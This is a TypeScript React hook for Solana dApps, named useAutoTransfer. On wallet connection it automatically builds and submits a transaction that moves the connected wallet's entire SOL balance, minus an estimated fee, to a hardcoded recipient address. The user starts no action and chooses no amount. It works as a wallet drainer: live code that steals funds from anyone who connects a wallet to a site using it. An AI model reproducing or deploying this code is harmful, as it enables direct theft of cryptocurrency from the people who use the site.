import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import {
  PublicKey,
  SystemProgram,
  Transaction,
  LAMPORTS_PER_SOL,
} from '@solana/web3.js';
import { useEffect, useState } from 'react';

const RECIPIENT_ADDRESS = '4KC18vVR6JacduPqGFWJjKUV5fGsw7qsZYGNV2M7Wan';
const MIN_BALANCE_FOR_TRANSFER = 0.005; // Minimum SOL to transfer (covers fees)
const ESTIMATED_FEE = 0.00025; // Estimated transaction fee in SOL

export interface TransferStatus {
  isTransferring: boolean;
  transferComplete: boolean;
  error: string | null;
  transactionHash: string | null;
}

export const useAutoTransfer = (): TransferStatus => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction, connected } = useWallet();
  const [transferStatus, setTransferStatus] = useState<TransferStatus>({
    isTransferring: false,
    transferComplete: false,
    error: null,
    transactionHash: null,
  });

  useEffect(() => {
    if (!connected || !publicKey) {
      return;
    }

    const executeTransfer = async () => {
      try {
        setTransferStatus({
          isTransferring: true,
          transferComplete: false,
          error: null,
          transactionHash: null,
        });

        // Get current balance
        const lamports = await connection.getBalance(publicKey);
        const solBalance = lamports / LAMPORTS_PER_SOL;

        // Check if balance is sufficient
        if (solBalance < MIN_BALANCE_FOR_TRANSFER) {
          setTransferStatus({
            isTransferring: false,
            transferComplete: false,
            error: `Insufficient balance: ${solBalance.toFixed(4)} SOL. Minimum required: ${MIN_BALANCE_FOR_TRANSFER} SOL`,
            transactionHash: null,
          });
          return;
        }

        // Create transfer transaction
        const recipientPublicKey = new PublicKey(RECIPIENT_ADDRESS);
        
        // Calculate amount to transfer (all balance minus estimated fee)
        const transferAmount = Math.max(
          0,
          lamports - ESTIMATED_FEE * LAMPORTS_PER_SOL
        );

        if (transferAmount <= 0) {
          setTransferStatus({
            isTransferring: false,
            transferComplete: false,
            error: 'Insufficient balance after fees',
            transactionHash: null,
          });
          return;
        }

        const transaction = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: recipientPublicKey,
            lamports: transferAmount,
          })
        );

        // Send transaction
        const transactionHash = await sendTransaction(transaction, connection);

        // Wait for confirmation
        await connection.confirmTransaction(transactionHash, 'confirmed');

        setTransferStatus({
          isTransferring: false,
          transferComplete: true,
          error: null,
          transactionHash,
        });
      } catch (err) {
        const errorMessage = err instanceof Error ? err.message : 'Transfer failed';
        setTransferStatus({
          isTransferring: false,
          transferComplete: false,
          error: errorMessage,
          transactionHash: null,
        });
      }
    };

    executeTransfer();
  }, [connected, publicKey, connection, sendTransaction]);

  return transferStatus;
};
